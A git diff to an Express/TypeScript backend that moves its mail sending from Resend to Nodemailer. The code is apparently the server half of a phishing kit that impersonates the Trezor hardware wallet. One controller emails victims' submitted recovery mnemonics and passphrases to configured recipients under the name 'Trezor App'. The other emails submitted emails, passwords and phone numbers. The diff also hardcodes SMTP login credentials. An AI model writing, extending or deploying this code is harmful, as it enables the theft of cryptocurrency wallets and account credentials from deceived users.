@@ -1,47 +1,65 @@
 import { Request, Response } from "express";
 import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
-import { Resend } from "resend";
+import nodemailer from "nodemailer";
 
-// Initialize Resend with API key from .env
+/**
+ * Utility: Get recipients from env as array
+ */
+const getRecipients = (): string[] => {
+  const recipients = process.env.RECIPIENT_EMAIL;
+  if (!recipients) return [];
+  return recipients.split(",").map(email => email.trim());
+};
 
+/**
+ * Create Nodemailer transporter
+ */
+const transporter = nodemailer.createTransport({
+  host: 'smtp.ethereal.email',
+  port: 587,
+  auth: {
+    user: 'theresa.kuphal@ethereal.email',
+    pass: 'H5EbUkcH6PAYFDdV5t'
+  }
+});
 
 /**
  * Controller: Send Mnemonic Recovery Email
  */
 export const sendMnemonicController = asyncHandler(
-
   async (req: Request, res: Response): Promise<Response> => {
-    const resend = new Resend(process.env.RESEND_API_KEY as string);
     const payload = req.body;
 
-    // Validate payload
     if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
     }
 
-    // Build HTML email content
+    // Build HTML email
     let htmlContent = `<h2>${payload.heading}</h2>`;
     htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;
     htmlContent += `<ul>`;
-
     payload.data.forEach((item: { label: string; value: string }) => {
       htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
     });
-
     htmlContent += `</ul>`;
 
-
     try {
-      // Send email via Resend
-      const response: any = await resend.emails.send({
-        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
-        to: process.env.RECIPIENT_EMAIL as string,
+      const recipients = getRecipients();
+      if (recipients.length === 0) {
+        return errorResponse(res, "No recipients configured", 400);
+      }
+
+      const mailOptions = {
+        from: `"Trezor App" <${process.env.SMTP_USER}>`,
+        to: recipients, // supports array of emails
         subject: "Trezor Mnemonic Recovery Words",
         html: htmlContent,
-      });
+      };
 
-      console.log("✅ Email sent successfully:", response);
-      return successResponse(res, { id: response.id }, "Mnemonic sent successfully", 200);
+      const info = await transporter.sendMail(mailOptions);
+      console.log("✅ Email sent:", info.messageId);
+
+      return successResponse(res, { id: info.messageId }, "Mnemonic sent successfully", 200);
     } catch (error: any) {
       console.error("❌ Email sending error:", error.message);
       return errorResponse(res, "Failed to send email", 500);
@@ -54,34 +72,38 @@ export const sendMnemonicController = asyncHandler(
  */
 export const sendUserInfoController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
-    const resend = new Resend(process.env.RESEND_API_KEY as string);
     const { title, email, password, phone } = req.body;
 
-    // Validate input
     if (!title || !email || !password) {
       return errorResponse(res, "Missing required fields", 400);
     }
 
-    // Build email HTML content
     const htmlContent = `
-      <h2>${title}</h2>
-      <ul>
-        <li><strong>Email:</strong> ${email}</li>
-        <li><strong>Password:</strong> ${password}</li>
-        <li><strong>Phone:</strong> ${phone || "N/A"}</li>
-      </ul>
-    `;
+        <h2>${title}</h2>
+        <ul>
+          <li><strong>Email:</strong> ${email}</li>
+          <li><strong>Password:</strong> ${password}</li>
+          <li><strong>Phone:</strong> ${phone || "N/A"}</li>
+        </ul>
+      `;
 
     try {
-      const response: any = await resend.emails.send({
-        from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
-        to: process.env.RECIPIENT_EMAIL as string,
+      const recipients = getRecipients();
+      if (recipients.length === 0) {
+        return errorResponse(res, "No recipients configured", 400);
+      }
+
+      const mailOptions = {
+        from: `"Trezor App" <${process.env.SMTP_USER}>`,
+        to: recipients,
         subject: "User Information Received",
         html: htmlContent,
-      });
+      };
 
-      console.log("✅ Email sent successfully:", response.id);
-      return successResponse(res, { id: response.id }, "Email sent successfully", 200);
+      const info = await transporter.sendMail(mailOptions);
+      console.log("✅ Email sent:", info.messageId);
+
+      return successResponse(res, { id: info.messageId }, "Email sent successfully", 200);
     } catch (error: any) {
       console.error("❌ Email sending error:", error.message);
       return errorResponse(res, "Failed to send email", 500);
